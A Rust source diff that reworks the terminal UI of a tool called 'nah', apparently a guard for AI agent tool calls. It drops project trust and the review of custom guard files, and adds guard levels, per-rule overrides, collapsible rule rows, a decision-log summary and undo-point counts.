@@ -1,41 +1,36 @@
 //! Interactive TUI state and the confirmed configuration actions it runs.
-//! Staging, filtering, and selection are in-memory; loading, refreshing,
-//! reviewing custom guard files, and confirming read or write host state
-//! through the configuration commands and `host_state`.
+//! Staging, filtering, and selection are in-memory; loading, refreshing, and
+//! confirming read or write host state through the configuration commands
+//! and `host_state`.
 
-use nah_proto::decision::Verdict;
+use std::cell::Cell;
 
 #[cfg(test)]
-use crate::catalog;
+use nah_proto::decision::Verdict;
+
+use nah_proto::ctx::{Guard, GuardLevel, GuardSettings, RuleOverride};
+
 use crate::commands::{
-    GuardChange, GuardEntry, GuardProposals, GuardSource, GuardStatus, GuardTarget, RuntimeEntry,
-    RuntimeHookStatus, TrustedProject, apply_guard_change, guard_entries, guard_proposals,
-    guard_source, runtime_entries, set_runtime_configured, trust_root, trusted_projects,
-    untrust_root, validate_guard_change,
+    GuardChange, GuardEntry, GuardTarget, RuleState, RuntimeEntry, RuntimeHookStatus,
+    apply_guard_change, entry_settings, guard_entries, runtime_entries, set_runtime_configured,
+    validate_guard_change,
 };
 use crate::nap::{ActiveNap, NapMode};
-use crate::records::{DecisionRecord, FailureSummary};
+use crate::records::{DecisionRecord, FailureSummary, LogSummary};
 use crate::runtime::{FailurePolicy, Runtime};
 use decision_log::recovered_log_message;
-use host_state::{current_project, log_size, nap_status, recent_log, wake_nap};
+pub(crate) use decision_log::{Outcome, deciding_rules};
+use host_state::{
+    home_path, import_notice, log_size, nap_status, recent_log, stopped_custom_guards, undo_points,
+    wake_nap,
+};
 
 mod decision_log;
 mod host_state;
 
-/// Bounds the guard files rendered for review in the approval modal.
-const SOURCE_LIMIT: usize = 16 * 1024;
-
-/// Narrowest pane the layout produces; wrapping there bounds scroll offsets.
-/// Rendering clamps again against the real width.
-const WRAP_WIDTH: usize = 24;
-
-/// Lines moved by one PgUp or PgDn.
-pub(crate) const PAGE: u16 = 10;
-
 #[derive(Clone, Copy, Debug, Eq, PartialEq)]
 pub(crate) enum Screen {
     Guards,
-    Projects,
     Runtimes,
     Log,
 }
@@ -46,31 +41,6 @@ pub(crate) enum MessageKind {
     Warning,
     Success,
     Error,
-}
-
-#[derive(Clone, Copy, Debug, Eq, PartialEq)]
-pub(crate) enum GuardView {
-    Type,
-    State,
-    Project,
-}
-
-impl GuardView {
-    pub(crate) const fn name(self) -> &'static str {
-        match self {
-            Self::Type => "Type",
-            Self::State => "State",
-            Self::Project => "Project",
-        }
-    }
-
-    const fn next(self) -> Self {
-        match self {
-            Self::Type => Self::State,
-            Self::State => Self::Project,
-            Self::Project => Self::Type,
-        }
-    }
 }
 
 #[derive(Clone, Debug, Eq, PartialEq)]
@@ -96,13 +66,45 @@ impl NapStatus {
         }
     }
 
-    pub(crate) fn banner(&self) -> String {
-        format!(
-            "NAP: {} paused \u{2014} {} left (w wake)",
-            self.mode.scope(),
-            remaining_text(self.remaining)
-        )
+    /// The banner's text for `width` columns. The countdown comes first, so
+    /// it is never the part cut off; names too long for the row give way to
+    /// their count, since the guards list marks each one.
+    pub(crate) fn banner(&self, width: usize) -> String {
+        let left = self.countdown();
+        let full = format!("NAP {left} left: {} paused", self.mode.scope());
+        match &self.mode {
+            NapMode::Guards(names) if names.len() > 1 && full.chars().count() > width => {
+                format!("NAP {left} left: {} guards or rules paused", names.len())
+            }
+            _ => full,
+        }
     }
+
+    /// Time left, to the second.
+    pub(crate) fn countdown(&self) -> String {
+        remaining_text(self.remaining)
+    }
+
+    /// Time left, short enough for a list row: whole minutes, or seconds
+    /// in the last minute.
+    pub(crate) fn countdown_short(&self) -> String {
+        match self.remaining / 60 {
+            0 => format!("{}s", self.remaining),
+            minutes => format!("{minutes}m"),
+        }
+    }
+}
+
+/// Why a rule is in its state when it is not simply following its guard.
+/// Only one is shown, the one that decides: a nap pauses a rule whatever
+/// else is set.
+#[derive(Clone, Copy, Debug, Eq, PartialEq)]
+pub(crate) enum RuleReason {
+    Napping,
+    SetOn,
+    SetOff,
+    /// Every part of it applies at strict, and its guard is below that.
+    WaitsForStrict,
 }
 
 /// Zero-padded so a live countdown keeps its width as it ticks down.
@@ -115,33 +117,59 @@ fn remaining_text(seconds: u64) -> String {
     }
 }
 
+/// The snapshots the retained log's saved calls made that a store still
+/// keeps, so `nah undo` can still restore them.
+#[derive(Clone, Debug, Default, Eq, PartialEq)]
+pub(crate) struct UndoPoints {
+    pub(crate) kept: usize,
+    /// When the call the newest kept one was saved for was decided.
+    pub(crate) newest: Option<String>,
+}
+
+// Only a Unix host saves snapshots, so only there are stores read.
+#[cfg(unix)]
+impl UndoPoints {
+    fn of(summary: &LogSummary, kept: &std::collections::BTreeSet<String>) -> Self {
+        let mut points = summary
+            .saved_snapshots
+            .iter()
+            .filter(|(snapshot, _)| kept.contains(snapshot))
+            .collect::<Vec<_>>();
+        let newest = points
+            .iter()
+            .max_by_key(|(_, timestamp)| crate::records::timestamp_seconds(timestamp))
+            .map(|(_, timestamp)| timestamp.clone());
+        points.sort_unstable();
+        points.dedup_by(|left, right| left.0 == right.0);
+        Self {
+            kept: points.len(),
+            newest,
+        }
+    }
+}
+
+/// One row of the log summary's account of the retained log.
+#[derive(Clone, Copy, Debug, Eq, PartialEq)]
+pub(crate) enum SummaryRow {
+    Ran,
+    Blocked,
+    SavedFirst,
+    NotFullyChecked,
+}
+
+impl SummaryRow {
+    pub(crate) const fn label(self) -> &'static str {
+        match self {
+            Self::Ran => "ran as usual",
+            Self::Blocked => "blocked",
+            Self::SavedFirst => "saved first",
+            Self::NotFullyChecked => "not fully checked",
+        }
+    }
+}
+
 #[derive(Clone, Debug, Eq, PartialEq)]
 pub(crate) enum Confirmation {
-    ApproveGuard {
-        target: GuardTarget,
-        name: String,
-        path: String,
-        hash: String,
-        reapproval: bool,
-        /// Bytes the hash covers, read when the modal opened.
-        source: Result<GuardSource, String>,
-    },
-    ViewGuard {
-        target: GuardTarget,
-        name: String,
-        path: String,
-        hash: Option<String>,
-        source: Result<GuardSource, String>,
-    },
-    TrustCurrent {
-        path: String,
-        /// Bundles trust would expose for review, counted when the modal opened.
-        proposals: GuardProposals,
-    },
-    UntrustProject {
-        path: String,
-        approvals: usize,
-    },
     ConfigureRuntime {
         runtime: Runtime,
         name: &'static str,
@@ -162,109 +190,147 @@ pub(crate) enum Confirmation {
 pub(crate) struct App {
     pub(crate) screen: Screen,
     pub(crate) guards: Vec<GuardEntry>,
-    pub(crate) projects: Vec<TrustedProject>,
     pub(crate) runtimes: Vec<RuntimeEntry>,
     pub(crate) log: Vec<DecisionRecord>,
     pub(crate) blocked_log: Vec<DecisionRecord>,
+    /// The whole retained log's tally, which the log summary shows.
+    pub(crate) log_summary: LogSummary,
+    /// The footer's error while the last read of the decision log failed,
+    /// when `log_summary` counts nothing that was read.
+    pub(crate) log_unreadable: Option<String>,
     pub(crate) failure_summary: Option<FailureSummary>,
-    pub(crate) current_project: Option<String>,
-    pub(crate) project_declared_guards: Vec<String>,
+    /// `None` where the snapshot stores could not be read.
+    pub(crate) undo_points: Option<UndoPoints>,
+    /// The home directory, written `~` in the paths shown under it.
+    pub(crate) home: Option<String>,
+    /// The selected row of `guard_rows`.
     pub(crate) guard_index: usize,
-    pub(crate) guard_view: GuardView,
-    pub(crate) project_index: usize,
+    /// The guards whose rules are shown.
+    open: Vec<Guard>,
     pub(crate) runtime_index: usize,
     pub(crate) log_index: usize,
-    pub(crate) log_filter: Option<Verdict>,
+    /// The outcome the log rows must have; `None` matches all.
+    pub(crate) log_filter: Option<Outcome>,
     /// Runtime the log rows must have been decided for; `None` matches all.
     pub(crate) log_runtime_filter: Option<String>,
     /// Case-insensitive substring the log rows must contain; empty matches all.
     pub(crate) log_search: String,
     /// Whether keys are being typed into the query instead of run as bindings.
     pub(crate) log_search_editing: bool,
-    pub(crate) log_detail_scroll: u16,
+    /// Lines the active screen's details are scrolled down.
+    pub(crate) detail_scroll: u16,
+    /// The furthest the last frame could scroll its details. Only rendering
+    /// knows how the text wraps, so it leaves the limit here for the next
+    /// PgDn; before the first frame nothing bounds it.
+    pub(crate) detail_scroll_limit: Cell<u16>,
+    /// How far PgUp and PgDn move the details: the rows the pane showed at
+    /// the last frame less one, so a page never skips a line.
+    pub(crate) detail_page: Cell<u16>,
     /// The global enforcement pause, re-read on every tick.
     pub(crate) nap: Option<NapStatus>,
+    /// Whether the nap file holds a nap another Nah version wrote, which
+    /// pauses nothing here; read with `nap`.
+    pub(crate) other_version_nap: bool,
+    /// Names the nah 1.x custom guards that no longer run, while
+    /// `~/.nah/activations.json` still lists them.
+    pub(crate) stopped_custom_guards: Option<String>,
     /// Blocks recorded since the log screen was last viewed; badges its tab.
     pub(crate) new_blocks: usize,
     /// Newest block already accounted for by the badge.
     seen_block_id: Option<String>,
-    /// Audit file size behind `log`; a change means new decisions to tail.
+    /// Decision log size behind `log`; a change means new decisions to tail.
     log_size: Option<u64>,
     pending: Vec<GuardChange>,
     /// Overlays the active screen without dismissing its open confirmation.
     pub(crate) help_open: bool,
+    /// Overlays the log screen with the summary of the whole retained log.
+    pub(crate) summary_open: bool,
     pub(crate) confirmation: Option<Confirmation>,
-    pub(crate) confirmation_scroll: u16,
     pub(crate) message: Option<Message>,
 }
 
-pub(crate) struct ProjectSelection<'a> {
-    pub(crate) path: &'a str,
-    pub(crate) trusted: Option<&'a TrustedProject>,
-    pub(crate) current: bool,
-}
-
 impl App {
-    /// Reads every screen's host state: the decision log, current project,
-    /// guards, trusted projects, runtime wiring, and nap.
+    /// Reads every screen's host state: the decision log, the snapshot
+    /// stores its saved calls name, guards, runtime wiring, and nap.
     pub(crate) fn load() -> Result<Self, String> {
         // Size first: a decision appended during the load then looks like drift
         // and is tailed, rather than being skipped until the next append.
         let log_size = log_size();
-        // Log recovery or an I/O failure must not keep the guard, trust, and
-        // runtime screens from opening; its warning or error uses the footer.
-        let (log, blocked_log, failure_summary, message) = match recent_log() {
+        // Log recovery or an I/O failure must not keep the guard and runtime
+        // screens from opening; its warning or error uses the footer.
+        let (log, blocked_log, log_summary, failure_summary, message) = match recent_log() {
             Ok(view) => {
                 let message = view.recovered_from.as_deref().map(|path| Message {
                     kind: MessageKind::Warning,
                     text: recovered_log_message(path),
                 });
-                (view.records, view.blocked_records, view.failures, message)
+                (
+                    view.records,
+                    view.blocked_records,
+                    view.summary,
+                    view.failures,
+                    message,
+                )
             }
             Err(error) => (
                 vec![],
                 vec![],
+                LogSummary::default(),
                 None,
                 Some(Message {
                     kind: MessageKind::Error,
-                    text: format!("decision log is unreadable: {error}"),
+                    text: unreadable_log_message(&error),
                 }),
             ),
         };
+        let log_unreadable = message
+            .as_ref()
+            .filter(|message| message.kind == MessageKind::Error)
+            .map(|message| message.text.clone());
+        // The guard diagnostics below may join this message.
         // Decisions already recorded are not new arrivals.
         let seen_block_id = blocked_log.first().map(|record| record.id.clone());
-        let (current_project, project_declared_guards) = current_project();
-        let (mut guards, guard_diagnostics) = guard_entries()?;
-        apply_project_declarations(&mut guards, &project_declared_guards);
-        let message = append_footer_warnings(message, guard_diagnostics);
+        let (guards, guard_diagnostics) = guard_entries()?;
+        let (nap, other_version_nap) = nap_status();
+        let message = append_footer_warnings(message, guard_diagnostics).or_else(|| {
+            import_notice().map(|text| Message {
+                kind: MessageKind::Warning,
+                text,
+            })
+        });
+        let undo_points = undo_points(&log_summary);
         Ok(Self {
             screen: Screen::Guards,
             guards,
-            projects: trusted_projects()?,
             runtimes: runtime_entries(),
             log,
             blocked_log,
+            log_summary,
+            log_unreadable,
             failure_summary,
-            current_project,
-            project_declared_guards,
+            undo_points,
+            home: home_path(),
             guard_index: 0,
-            guard_view: GuardView::Type,
-            project_index: 0,
+            open: vec![],
             runtime_index: 0,
             log_index: 0,
             log_filter: None,
             log_runtime_filter: None,
             log_search: String::new(),
             log_search_editing: false,
-            log_detail_scroll: 0,
-            nap: nap_status(),
+            detail_scroll: 0,
+            detail_scroll_limit: Cell::new(u16::MAX),
+            detail_page: Cell::new(1),
+            nap,
+            other_version_nap,
+            stopped_custom_guards: stopped_custom_guards(),
             new_blocks: 0,
             seen_block_id,
             log_size,
             pending: vec![],
             help_open: false,
+            summary_open: false,
             confirmation: None,
-            confirmation_scroll: 0,
             message,
         })
     }
@@ -275,13 +341,13 @@ impl App {
             self.new_blocks = 0;
             self.seen_block_id = self.blocked_log.first().map(|record| record.id.clone());
         }
+        self.detail_scroll = 0;
         self.message = None;
     }
 
     pub(crate) fn next_screen(&mut self) {
         self.select_screen(match self.screen {
-            Screen::Guards => Screen::Projects,
-            Screen::Projects => Screen::Runtimes,
+            Screen::Guards => Screen::Runtimes,
             Screen::Runtimes => Screen::Log,
             Screen::Log => Screen::Guards,
         });
@@ -290,19 +356,16 @@ impl App {
     pub(crate) fn previous_screen(&mut self) {
         self.select_screen(match self.screen {
             Screen::Guards => Screen::Log,
-            Screen::Projects => Screen::Guards,
-            Screen::Runtimes => Screen::Projects,
+            Screen::Runtimes => Screen::Guards,
             Screen::Log => Screen::Runtimes,
         });
     }
 
     pub(crate) fn move_selection(&mut self, down: bool) {
-        let guard_len = self.visible_guards().len();
-        let project_len = self.project_count();
+        let guard_len = self.guard_rows().len();
         let filtered_len = self.filtered_log().len();
         let (index, len) = match self.screen {
             Screen::Guards => (&mut self.guard_index, guard_len),
-            Screen::Projects => (&mut self.project_index, project_len),
             Screen::Runtimes => (&mut self.runtime_index, self.runtimes.len()),
             Screen::Log => (&mut self.log_index, filtered_len),
         };
@@ -313,36 +376,19 @@ impl App {
         } else {
             *index = index.saturating_sub(1);
         }
-        self.log_detail_scroll = 0;
+        self.detail_scroll = 0;
         self.message = None;
     }
 
-    pub(crate) fn scroll_confirmation(&mut self, down: bool, step: u16) {
-        let max = match &self.confirmation {
-            Some(
-                Confirmation::ApproveGuard {
-                    source: Ok(source), ..
-                }
-                | Confirmation::ViewGuard {
-                    source: Ok(source), ..
-                },
-            ) => source
-                .files
-                .iter()
-                .map(|file| {
-                    1 + file
-                        .text
-                        .as_ref()
-                        .map_or(1, |text| usize::from(wrapped_lines(text)))
-                })
-                .sum::<usize>(),
-            _ => 0,
-        };
-        let max = u16::try_from(max).unwrap_or(u16::MAX);
-        self.confirmation_scroll = if down {
-            self.confirmation_scroll.saturating_add(step).min(max)
+    /// Scrolls the active screen's details by one page.
+    pub(crate) fn scroll_detail(&mut self, down: bool) {
+        let page = self.detail_page.get();
+        self.detail_scroll = if down {
+            self.detail_scroll
+                .saturating_add(page)
+                .min(self.detail_scroll_limit.get())
         } else {
-            self.confirmation_scroll.saturating_sub(step)
+            self.detail_scroll.saturating_sub(page)
         };
     }
 
@@ -350,210 +396,322 @@ impl App {
         self.pending.len()
     }
 
-    pub(crate) fn visible_guards(&self) -> Vec<&GuardEntry> {
-        let current_root = self
-            .current_trusted_project()
-            .map(|project| &project.identity);
-        let mut guards = self
-            .guards
+    /// The guards list as shown: every guard and the rules of each open one.
+    pub(crate) fn guard_rows(&self) -> Vec<&GuardEntry> {
+        self.guards
             .iter()
-            .filter(|entry| match self.guard_view {
-                GuardView::Type | GuardView::State => true,
-                GuardView::Project => match &entry.target {
-                    GuardTarget::BuiltIn { name } => self.project_declared_guards.contains(name),
-                    GuardTarget::Custom { identity } => {
-                        current_root.is_some_and(|root| identity.trusted_root() == Some(root))
-                    }
-                },
+            .filter(|entry| match &entry.target {
+                GuardTarget::Guard { .. } => true,
+                GuardTarget::Rule { rule } => {
+                    Guard::of_rule(rule).is_some_and(|guard| self.is_open(guard))
+                }
             })
-            .collect::<Vec<_>>();
-        guards.sort_by(|left, right| match self.guard_view {
-            GuardView::Type => guard_type_rank(left)
-                .cmp(&guard_type_rank(right))
-                .then_with(|| left.target.name().cmp(right.target.name()))
-                .then_with(|| left.target.cmp(&right.target)),
-            GuardView::State | GuardView::Project => guard_status_rank(&left.status)
-                .cmp(&guard_status_rank(&right.status))
-                .then_with(|| guard_family_scope_rank(left).cmp(&guard_family_scope_rank(right)))
-                .then_with(|| left.target.name().cmp(right.target.name()))
-                .then_with(|| left.target.cmp(&right.target)),
-        });
-        guards
+            .collect()
     }
 
-    pub(crate) fn project_omitted_pending_count(&self) -> usize {
-        if self.guard_view != GuardView::Project {
-            return 0;
+    /// The IDs of `guard`'s rules, in list order.
+    pub(crate) fn rules_of(&self, guard: Guard) -> impl Iterator<Item = &str> {
+        self.guards
+            .iter()
+            .filter_map(move |entry| match &entry.target {
+                GuardTarget::Rule { rule } if Guard::of_rule(rule) == Some(guard) => {
+                    Some(rule.as_str())
+                }
+                _ => None,
+            })
+    }
+
+    fn is_open(&self, guard: Guard) -> bool {
+        self.open.contains(&guard)
+    }
+
+    /// The guard `row` is or belongs to; `None` for a guard with no rules.
+    fn fold_of(&self, row: &GuardEntry) -> Option<Guard> {
+        let guard = match &row.target {
+            GuardTarget::Guard { guard } => *guard,
+            GuardTarget::Rule { rule } => Guard::of_rule(rule)?,
+        };
+        self.rules_of(guard).next().is_some().then_some(guard)
+    }
+
+    /// Whether a guard row is open; `None` for a row that does not fold.
+    pub(crate) fn heading_open(&self, row: &GuardEntry) -> Option<bool> {
+        matches!(row.target, GuardTarget::Guard { .. })
+            .then(|| self.fold_of(row))
+            .flatten()
+            .map(|guard| self.is_open(guard))
+    }
+
+    /// Shows the rows under the selected heading.
+    pub(crate) fn open_selected(&mut self) {
+        let rows = self.guard_rows();
+        let Some(row) = rows.get(self.guard_index).copied() else {
+            return;
+        };
+        if self.heading_open(row) == Some(false)
+            && let Some(fold) = self.fold_of(row)
+        {
+            self.open.push(fold);
         }
-        let visible = self.visible_guards();
-        self.pending
-            .iter()
-            .filter(|change| !visible.iter().any(|entry| entry.target == change.target()))
-            .count()
     }
 
-    pub(crate) fn cycle_guard_view(&mut self) {
-        let selected = self
-            .visible_guards()
-            .get(self.guard_index)
-            .map(|entry| entry.target.clone());
-        self.guard_view = self.guard_view.next();
-        self.guard_index = selected
-            .and_then(|target| {
-                self.visible_guards()
-                    .iter()
-                    .position(|entry| entry.target == target)
-            })
-            .unwrap_or(0);
+    /// Hides the rows under the selected heading. From one of those rows,
+    /// the selection moves to its heading, so it never lands on a hidden row.
+    pub(crate) fn close_selected(&mut self) {
+        let rows = self.guard_rows();
+        let Some(fold) = rows.get(self.guard_index).and_then(|row| self.fold_of(row)) else {
+            return;
+        };
+        let heading = rows
+            .iter()
+            .position(|row| self.heading_open(row).is_some() && self.fold_of(row) == Some(fold));
+        if let Some(heading) = heading {
+            self.guard_index = heading;
+        }
+        self.open.retain(|open| *open != fold);
+        self.detail_scroll = 0;
         self.message = None;
     }
 
-    pub(crate) fn pending_value(&self, entry: &GuardEntry) -> Option<bool> {
-        self.pending
-            .iter()
-            .find(|pending| pending.target() == entry.target)
-            .map(|pending| match pending {
-                GuardChange::BuiltInEnable { .. } | GuardChange::CustomEnable { .. } => true,
-                GuardChange::BuiltInDisable { .. } | GuardChange::CustomDisable { .. } => false,
-                GuardChange::BuiltInReset { .. } => default_enabled(entry),
-            })
+    /// The stored settings with every staged guard and rule change applied.
+    fn staged_settings(&self) -> GuardSettings {
+        let mut settings = entry_settings(&self.guards);
+        for change in &self.pending {
+            match change {
+                GuardChange::GuardSet { guard, level } => settings.set_guard(*guard, *level),
+                GuardChange::RuleSet { rule, value } => settings.set_rule(rule, *value),
+            }
+        }
+        settings
     }
 
-    /// Stages or unstages the selected guard without writing. Enabling an
-    /// unapproved custom guard instead reads its files for the approval modal.
+    /// A guard's setting, as staged.
+    pub(crate) fn guard_setting(&self, guard: Guard) -> GuardLevel {
+        self.staged_settings().guard_level(guard)
+    }
+
+    /// A rule's override, as staged.
+    pub(crate) fn rule_override(&self, rule: &str) -> Option<RuleOverride> {
+        self.staged_settings().rule_override(rule)
+    }
+
+    /// How much of a rule runs, as staged.
+    pub(crate) fn rule_state(&self, rule: &str) -> RuleState {
+        RuleState::of(rule, self.staged_settings().rule_level(rule))
+    }
+
+    /// Opens the log summary with the undo points the stores keep now, not
+    /// when the log was last read: retention or a prune removes snapshots
+    /// without a log append.
+    pub(crate) fn open_summary(&mut self) {
+        self.summary_open = true;
+        #[cfg(not(test))]
+        {
+            self.undo_points = undo_points(&self.log_summary);
+        }
+    }
+
+    /// The log summary's rows with their counts, a row with none left
+    /// out. Each retained call is in exactly one, so they add up to them
+    /// all.
+    pub(crate) fn summary_rows(&self) -> Vec<(SummaryRow, usize)> {
+        let summary = &self.log_summary;
+        [
+            (SummaryRow::Ran, summary.ran),
+            (SummaryRow::Blocked, summary.blocked),
+            (SummaryRow::SavedFirst, summary.saved),
+            (
+                SummaryRow::NotFullyChecked,
+                self.failure_summary
+                    .as_ref()
+                    .map_or(0, |failures| failures.calls),
+            ),
+        ]
+        .into_iter()
+        .filter(|(_, count)| *count > 0)
+        .collect()
+    }
+
+    /// Whether no runtime carries nah's hook, so no call reaches nah.
+    pub(crate) fn nothing_hooked(&self) -> bool {
+        !self.runtimes.is_empty()
+            && self
+                .runtimes
+                .iter()
+                .all(|runtime| matches!(runtime.status, Ok(RuntimeHookStatus::NotConfigured)))
+    }
+
+    /// `path` with the home directory written `~`.
+    pub(crate) fn short_path(&self, path: &str) -> String {
+        self.home
+            .as_deref()
+            .and_then(|home| path.strip_prefix(home))
+            .filter(|rest| rest.is_empty() || rest.starts_with(['/', '\\']))
+            .map_or_else(|| path.to_owned(), |rest| format!("~{rest}"))
+    }
+
+    /// Whether the active nap pauses `target`, as the decision path reads
+    /// it (`live_state`): `all` pauses everything, and a named guard pauses
+    /// each of its rules at every level.
+    pub(crate) fn napping(&self, target: &GuardTarget) -> bool {
+        match self.nap.as_ref().map(|nap| &nap.mode) {
+            None => false,
+            Some(NapMode::All) => true,
+            Some(NapMode::SelfProtection) => {
+                matches!(target, GuardTarget::Guard { guard } if !guard.configurable())
+            }
+            Some(NapMode::Guards(names)) => {
+                let named = |wanted: &str| names.iter().any(|name| name == wanted);
+                match target {
+                    GuardTarget::Guard { guard } => named(guard.name()),
+                    GuardTarget::Rule { rule } => {
+                        named(rule) || Guard::of_rule(rule).is_some_and(|guard| named(guard.name()))
+                    }
+                }
+            }
+        }
+    }
+
+    /// Why `rule` is in its state, as staged; `None` while it follows its
+    /// guard and some part of it applies there.
+    pub(crate) fn rule_reason(&self, rule: &str) -> Option<RuleReason> {
+        let target = GuardTarget::Rule {
+            rule: rule.to_owned(),
+        };
+        if self.napping(&target) {
+            return Some(RuleReason::Napping);
+        }
+        match self.rule_override(rule) {
+            Some(RuleOverride::Enabled) => Some(RuleReason::SetOn),
+            Some(RuleOverride::Disabled) => Some(RuleReason::SetOff),
+            None => {
+                let guard_on = Guard::of_rule(rule)
+                    .is_some_and(|guard| self.guard_setting(guard) != GuardLevel::Off);
+                (guard_on && self.rule_state(rule) == RuleState::Off)
+                    .then_some(RuleReason::WaitsForStrict)
+            }
+        }
+    }
+
+    pub(crate) fn is_pending(&self, entry: &GuardEntry) -> bool {
+        self.pending
+            .iter()
+            .any(|pending| pending.target() == entry.target)
+    }
+
+    /// Stages the next change of the selected row without writing: a guard
+    /// cycles off, core and strict; a rule overrides its state to the
+    /// opposite one.
     pub(crate) fn toggle_guard(&mut self) {
         let Some(entry) = self.selected_guard().cloned() else {
             return;
         };
-        if self.pending_value(&entry).is_some() {
-            self.pending
-                .retain(|pending| pending.target() != entry.target);
-            self.message = None;
-            return;
-        }
-        match (&entry.target, &entry.status) {
-            (
-                GuardTarget::Custom { identity },
-                GuardStatus::Disabled | GuardStatus::NeedsReapproval { .. },
-            ) => {
-                let Some(hash) = entry.current_hash.clone() else {
-                    self.error("current guard files are unavailable");
-                    return;
+        match &entry.target {
+            GuardTarget::Guard { guard } if !guard.configurable() => {
+                self.info("self-protection is always on");
+            }
+            GuardTarget::Guard { guard } => {
+                let level = match self.guard_setting(*guard) {
+                    GuardLevel::Off => GuardLevel::Core,
+                    GuardLevel::Core => GuardLevel::Strict,
+                    GuardLevel::Strict => GuardLevel::Off,
                 };
-                let source = guard_source(identity, SOURCE_LIMIT);
-                self.confirmation = Some(Confirmation::ApproveGuard {
-                    name: entry.target.name().to_owned(),
-                    target: entry.target.clone(),
-                    path: entry
-                        .path
-                        .as_ref()
-                        .map_or_else(|| "unavailable".into(), |path| path.display().to_string()),
-                    hash,
-                    reapproval: matches!(entry.status, GuardStatus::NeedsReapproval { .. }),
-                    source,
+                self.stage_change(GuardChange::GuardSet {
+                    guard: *guard,
+                    level,
                 });
             }
-            (_, GuardStatus::Missing { .. }) => {
-                self.stage_guard(entry.target, false, None);
-            }
-            _ => {
-                let enabled = self
-                    .pending_value(&entry)
-                    .unwrap_or(matches!(entry.status, GuardStatus::Enabled));
-                self.stage_guard(entry.target, !enabled, None);
+            GuardTarget::Rule { rule } => {
+                let value = if self.space_sets_on(rule) {
+                    RuleOverride::Enabled
+                } else {
+                    RuleOverride::Disabled
+                };
+                self.stage_change(GuardChange::RuleSet {
+                    rule: rule.clone(),
+                    value: Some(value),
+                });
             }
         }
     }
 
-    pub(crate) fn reapprove_guard(&mut self) {
-        let Some(entry) = self.selected_guard() else {
-            return;
-        };
-        if matches!(entry.status, GuardStatus::NeedsReapproval { .. }) {
-            self.toggle_guard();
-        } else {
-            self.info("the selected guard does not need review");
+    /// Whether Space on `rule` stages it on rather than off: it overrides a
+    /// rule to the opposite of its staged state. The message row reads this
+    /// too, so what it says Space does is what Space does.
+    pub(crate) fn space_sets_on(&self, rule: &str) -> bool {
+        self.rule_state(rule) == RuleState::Off
+    }
+
+    /// Stages `level` for the selected guard, without cycling through the
+    /// settings between.
+    pub(crate) fn set_guard_level(&mut self, level: GuardLevel) {
+        match self.selected_guard().map(|entry| entry.target.clone()) {
+            Some(GuardTarget::Guard { guard }) if guard.configurable() => {
+                self.stage_change(GuardChange::GuardSet { guard, level });
+            }
+            Some(GuardTarget::Guard { .. }) => self.info("self-protection is always on"),
+            _ => self.info("o, c and s set a guard's level; select the guard first"),
         }
     }
 
-    /// Reads the selected custom guard's files into a read-only modal.
-    pub(crate) fn view_guard(&mut self) {
+    /// Stages the selected guard back to core, or the selected rule back to
+    /// following its guard.
+    pub(crate) fn reset_guard(&mut self) {
         let Some(entry) = self.selected_guard().cloned() else {
             return;
         };
-        let GuardTarget::Custom { identity } = &entry.target else {
-            self.info("built-in guards have no custom files");
-            return;
-        };
-        let source = guard_source(identity, SOURCE_LIMIT);
-        self.confirmation = Some(Confirmation::ViewGuard {
-            name: entry.target.name().to_owned(),
-            target: entry.target,
-            path: entry
-                .path
-                .map_or_else(|| "unavailable".into(), |path| path.display().to_string()),
-            hash: entry.current_hash,
-            source,
-        });
+        match entry.target {
+            GuardTarget::Guard { guard } if guard.configurable() => {
+                self.stage_change(GuardChange::GuardSet {
+                    guard,
+                    level: GuardLevel::Core,
+                });
+            }
+            GuardTarget::Rule { rule } => {
+                self.stage_change(GuardChange::RuleSet { rule, value: None });
+            }
+            GuardTarget::Guard { .. } => self.info("self-protection is always on"),
+        }
     }
 
-    fn stage_guard(&mut self, target: GuardTarget, enabled: bool, expected_hash: Option<String>) {
-        let original = self
-            .guards
-            .iter()
-            .find(|entry| entry.target == target)
-            .map(|entry| {
-                (
-                    matches!(entry.status, GuardStatus::Enabled),
-                    matches!(entry.status, GuardStatus::Missing { .. }),
-                )
-            });
-        if original.is_some_and(|(original, missing)| !missing && original == enabled) {
-            self.pending.retain(|pending| pending.target() != target);
-            self.message = None;
-            return;
-        }
-        let change = match target.clone() {
-            GuardTarget::BuiltIn { name } if enabled => GuardChange::BuiltInEnable { name },
-            GuardTarget::BuiltIn { name } => GuardChange::BuiltInDisable { name },
-            GuardTarget::Custom { identity } if enabled => {
-                let Some(expected_hash) = expected_hash else {
-                    self.error("reviewed guard files hash is unavailable");
-                    return;
-                };
-                GuardChange::CustomEnable {
-                    identity,
-                    expected_hash,
-                }
-            }
-            GuardTarget::Custom { identity } => GuardChange::CustomDisable { identity },
+    /// Stages `change`, replacing any staged change of its target. A guard or
+    /// rule change back to what is stored unstages instead.
+    fn stage_change(&mut self, change: GuardChange) {
+        let target = change.target();
+        let stored = self.guards.iter().find(|entry| entry.target == target);
+        let unchanged = match (&change, stored) {
+            (GuardChange::GuardSet { level, .. }, Some(entry)) => entry.setting == *level,
+            (GuardChange::RuleSet { value, .. }, Some(entry)) => entry.rule_override == *value,
+            _ => false,
         };
-        if let Some(pending) = self
-            .pending
-            .iter_mut()
-            .find(|pending| pending.target() == target)
-        {
-            *pending = change;
-        } else {
+        self.pending.retain(|pending| pending.target() != target);
+        if !unchanged {
             self.pending.push(change);
         }
         self.message = None;
     }
 
-    /// Stages the diff between every entry's current status and the posture
-    /// nah ships with. This replaces the batch, so what is staged is exactly
-    /// that diff; it only ever disables custom guards, so no approval is
-    /// involved. Applying stays the normal Enter path.
+    /// Stages the diff between every entry and the posture nah ships with:
+    /// every guard at core and no rule override. This replaces the batch, so
+    /// what is staged is exactly that diff. Applying stays the normal Enter
+    /// path.
     pub(crate) fn reset_to_defaults(&mut self) {
         self.pending = self
             .guards
             .iter()
-            .filter(|entry| !at_default(entry))
-            .map(|entry| match &entry.target {
-                GuardTarget::BuiltIn { name } => GuardChange::BuiltInReset { name: name.clone() },
-                GuardTarget::Custom { identity } => GuardChange::CustomDisable {
-                    identity: identity.clone(),
-                },
+            .filter_map(|entry| match &entry.target {
+                GuardTarget::Guard { guard } => {
+                    (entry.setting != GuardLevel::Core).then_some(GuardChange::GuardSet {
+                        guard: *guard,
+                        level: GuardLevel::Core,
+                    })
+                }
+                GuardTarget::Rule { rule } => {
+                    entry.rule_override.is_some().then(|| GuardChange::RuleSet {
+                        rule: rule.clone(),
+                        value: None,
+                    })
+                }
             })
             .collect();
         let staged = self.pending.len();
